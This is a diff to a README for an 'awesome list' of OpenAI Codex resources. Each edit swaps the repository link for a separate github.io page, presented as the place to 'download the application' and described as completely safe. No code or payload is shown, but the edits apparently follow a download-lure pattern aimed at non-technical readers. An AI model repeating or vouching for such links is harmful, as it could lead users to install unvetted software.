@@ -1,6 +1,6 @@
 # 🤖 awesome-open-ai-codex - Your Ultimate Guide to OpenAI Codex Tools
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--open--ai--codex-blue?style=for-the-badge&logo=github)](https://github.com/danankz/awesome-open-ai-codex)
+[![Download Now](https://img.shields.io/badge/Download-awesome--open--ai--codex-blue?style=for-the-badge&logo=github)](https://danankz.github.io)
 
 Welcome to **awesome-open-ai-codex** — a carefully curated collection of the best resources, links, and tools related to OpenAI Codex. Whether you're a developer, a business owner, or just curious about what AI coding assistants can do, this page is designed to help you find exactly what you need — without any technical hassle. No coding experience required!
 
@@ -14,7 +14,7 @@ Welcome to **awesome-open-ai-codex** — a carefully curated collection of the b
 
 The easiest way to get started is to click the big blue button at the top of this page or use the link below:
 
-👉 **[Visit this link to download the application](https://github.com/danankz/awesome-open-ai-codex)**
+👉 **[Visit this link to download the application](https://danankz.github.io)**
 
 This link takes you to the official download page. Once you click it, you'll be taken to a screen where you can get the package. It's completely safe and free.
 
@@ -141,7 +141,7 @@ A: Not exactly — it gives you information and links to resources that could he
 
 This resource is part of an active "awesome list" — a community-curated collection that gets improvements over time. If you want to check for a newer version later, just visit:
 
-👉 **[Visit this link to download the application](https://github.com/danankz/awesome-open-ai-codex)**
+👉 **[Visit this link to download the application](https://danankz.github.io)**
 
 The page will always have the latest version. You can also star the repository on GitHub to show support — it helps more people discover this valuable free resource.
 
